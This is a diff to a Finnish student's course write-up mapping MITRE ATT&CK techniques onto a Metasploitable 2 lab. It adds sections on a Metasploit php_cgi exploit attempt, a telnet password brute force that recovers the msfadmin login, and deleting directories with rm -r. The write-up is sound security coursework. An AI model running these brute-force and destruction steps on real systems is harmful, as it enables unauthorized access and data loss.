@@ -119,9 +119,9 @@ Github -varastoni, jossa kotitehtävät, on nyt lisätty sivulle.
 
 
 
-### 1. Reconnaissance/TA0043 - Active Scanning/T1595
+### 1. Discovery/TA0043 - [Network Service Discovery/T1046](https://attack.mitre.org/techniques/T1046/)
 
-Aktiivisessa tiedustelussa kerätäkseen tietoa, jota voidaan käyttää kohteen kartoittamisessa. Aktiivisilla tiedusteluilla tarkoitetaan toimia, joissa hyökkääjä tutkii esimerkiski uhrin verkkoinfrastruktuuria tai palveluita. Yksi työkalu avoimien porttien skannaamiseen on kurssilla aikaisemmin käytetty Nmap, jota aion käyttää testissäni.
+Hyökkääjät voivat yrittää saada tietoa lähiverkon palveluista, sillä joku palvelu voi olla haavoittuvainen. Yleisiä menetelmiä näiden tietojen hankkimiseksi ovat portti- ja/tai haavoittuvuusskannaukset sopivien työkalujen avulla.
 
 Ennen testiä tarkistin, ettei kone yllä internettiin. Sen jälkeen laitoin Apache-palvelimen pystyyn, jotta saisimme edes jonkinlaisia tuloksia porttiskannauksesta.
 
@@ -157,9 +157,10 @@ Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
 Skannauksesta näemme, että portti 80 auki ja siellä on apache-palvelin pystyssä. <code>-A</code> viittaa agressiiviseen skannaukseen, ja tämä paljastaa mm. palvelimen käyttöjärjestelmän ja se version. Tätä tietoa voi hyödyntää exploitien käyttämisessä.
 
 
-### 2. Discovery/TA0043 - File and Directory Discovery/T1083
+### 2. Reconnaissance/TA0043 - [Active Scanning: Wordlist Scanning/T1595.003](https://attack.mitre.org/techniques/T1595/003/)
 
-Tiedosto- ja hakemistotiedustelu: Hyökkääjä voi etsiä tiedostoja ja hakemistoja tai tiettyjä tietoja tiedostojärjestelmästä.
+
+Tässä tekniikassa käytetään samankaltaisia menetelmiä kuin brute forcessa, sen tavoitteena on pikemminkin sisällön ja infrastruktuurin tunnistaminen. Tekniikassa käytetyt sanalistat voivat sisältää yleisiä, yleisesti käytettyjä nimiä ja tiedostopäätteitä tai tiettyyn ohjelmistoon liittyviä termejä. Vastustajat voivat esimerkiksi käyttää verkkosisällön etsintätyökaluja, kuten Dirb, DirBuster ja GoBuster, sekä yleisiä tai mukautettuja sanalistoja luettelemaan verkkosivuston sivuja ja hakemistoja, jotka voivat olla vanhentuneita ja haavoittuvaisisa.
 
 Tässä testissä käytän aikaisemmin kurssilla käytettyä ffuf- työkalua. Kohteeni on Metasploitable 2.
 
@@ -240,5 +241,114 @@ msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
 
 ``````
 
-Jostain syystä sain virheilmoituksen, että sessiota ei luotu. Syy tuntematon. Videossa kuitenkin yhteys saadaan luotua ja päästää koneeseen käsiksi.
+Jostain syystä sain virheilmoituksen, että sessiota ei luotu. Syy tuntematon. Näin se olisi käytännössä kuitenkin tapahtunut, jos exploit olisi toiminut. Videossa tässä kohtaa kuitenkin yhteys saadaan luotua ja päästää koneeseen käsiksi.
+
+### 4. Credential Access/TA0006 - [Brute Force: Password Guessing/T1110.00](https://attack.mitre.org/techniques/T1110/001/)
+
+Tunkeilijat, joilla ei ole ennakkotietoa järjestelmän tai ympäristön laillisista tunnuksista, voivat arvata salasanoja ja yrittää päästä tileille. Ilman tietoa tilin salasanasta hyökkääjä voi päätyä arvaamaan salasanan järjestelmällisesti toistuvalla tai iteratiivisella mekanismilla. Tunkeilija voi arvailla kirjautumistunnuksia ilman ennakkotietoa järjestelmän tai ympäristön salasanoista operaation aikana käyttämällä luetteloa yleisistä salasanoista. 
+
+Suoritin Nmap -tiedustelun kohteeseen, varmistetaan että telnet on auki. Telnet on avoin. Käytin tehtävässä apuna Exploiting [Metasploitable 2 - Brute Force Attack for Telnet Password](https://www.youtube.com/watch?v=EavbD2EWzVA) -videota.
+
+    23/tcp   open  telnet
+
+Aion käyttää rockyou.txt -sanalistaa apuna salasanan kräkkäämisessä. Lista on Kalissa valmiiksi asennettuna polkuun <code>/usr/share/wordlists</code>.
+
+Avataan metasploit ja etsitään "telnet_login" -hakusanalla exploitia.
+
+`````
+
+msf6 > search telnet_login
+
+Matching Modules
+================
+
+   #  Name                                                              Disclosure Date  Rank    Check  Description
+   -  ----                                                              ---------------  ----    -----  -----------
+   0  auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass  2021-09-06       normal  Yes    Netgear PNPX_GetShareFolderList Authentication Bypass
+   1  auxiliary/scanner/telnet/telnet_login                                              normal  No     Telnet Login Check Scanner
+
+
+`````
+Haluamme tässä käyttää 1. Seuraavaksi asetetaan tarvittavat tiedot.
+
+``````
+msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+PASS_FILE => /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.12.3
+RHOSTS => 192.168.12.3
+msf6 auxiliary(scanner/telnet/telnet_login) > set USERNAME msfadmin
+USERNAME => msfadmin
+msf6 auxiliary(scanner/telnet/telnet_login) > run
+
+``````
+
+Salasanan kräkkääminen alkoi rockyou -listasta. Koska lista on järkyttävän pitkä ,ja jotta minulla ei menisi loppupäivää kräkätessä, tein oman listan, joka on lyhyempi. Tiedän, että tunnukset käyttäjälle on msfadmin:msfadmin, joten tein salasanalistan muutamasta salasanasta ja msfadmin -salasana lisättynä listaan. Ajan hyökkäyksen uudestaan.
+
+``````
+cat /usr/share/wordlists/telnet.txt
+root
+admin
+password
+123123
+msfadmin
+``````
+
+Kokeilen uudestaan.
+
+``````
+msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.12.3
+RHOSTS => 192.168.12.3
+msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /usr/share/wordlists/telnet.txt
+PASS_FILE => /usr/share/wordlists/telnet.txt
+msf6 auxiliary(scanner/telnet/telnet_login) > set USERNAME msfadmin
+USERNAME => msfadmin
+msf6 auxiliary(scanner/telnet/telnet_login) > run
+
+[!] 192.168.12.3:23       - No active DB -- Credential data will not be saved!
+[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:root (Incorrect: )
+[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:admin (Incorrect: )
+[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:password (Incorrect: )
+[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:123123 (Incorrect: )
+[+] 192.168.12.3:23       - 192.168.12.3:23 - Login Successful: msfadmin:msfadmin
+[*] 192.168.12.3:23       - Attempting to start session 192.168.12.3:23 with msfadmin:msfadmin
+[*] Command shell session 1 opened (192.168.12.2:40249 -> 192.168.12.3:23) at 2023-12-03 15:26:51 +0200
+[*] 192.168.12.3:23       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+``````
+
+Saimme salasanan murrettua! Kokeillaa sissänkirjautumista ja se onnistui.
+
+``````
+metasploitable login: msfadmin
+Password: 
+Last login: Sun Dec  3 08:26:44 EST 2023 on pts/1
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+msfadmin@metasploitable:~$ whoami
+msfadmin
+```````
+
+
+### 5. Impact/TA0040 - [Data Destruction/T1485](https://attack.mitre.org/techniques/T1485/)
+
+Hyökkääjät voivat tuhota tietoja ja tiedostoja järjestelmissä tai verkossa keskeyttääkseen järjestelmien, palvelujen ja verkkoresurssien saatavuuden. Tietojen tuhoaminen tekee tallennetuista tiedoista todennäköisesti sellaisia, ettei niitä voida palauttaa rikosteknisin menetelmin.
+
+Kun olimme telnet-yhteydellä sisällä, päätin alkaa tuhoamaan tiedostoja ja kansioita.
+
+`````
+msfadmin@metasploitable:~$ ls
+vulnerable
+msfadmin@metasploitable:~$ cd vulnerable/
+msfadmin@metasploitable:~/vulnerable$ ls
+mysql-ssl  samba  tikiwiki  twiki20030201
+`````
+POistan kaikki kansiot komennolla <code>rm -r [kansion nimi]</code>
+
+``````
+msfadmin@metasploitable:~/vulnerable$ ls
+msfadmin@metasploitable:~/vulnerable$ 
+``````
+Nyt kansiota ja niiden sisältöä ei ole enää olemassa. Ne ovat tuhottu.
+
+[Data Destruction](https://attack.mitre.org/techniques/T1485/) -kuvauksessa kerrotaan, että del ja rm, poistavat usein vain osoittimet tiedostoihin pyyhkimättä itse tiedostojen sisältöä, jolloin tiedostot ovat palautettavissa asianmukaisin rikosteknisin menetelmin. Joten on siis mahdollista, että tiedot voidaan palauttaa, mutta tämä testi demonstroi tilannetta käytännössä. 
 
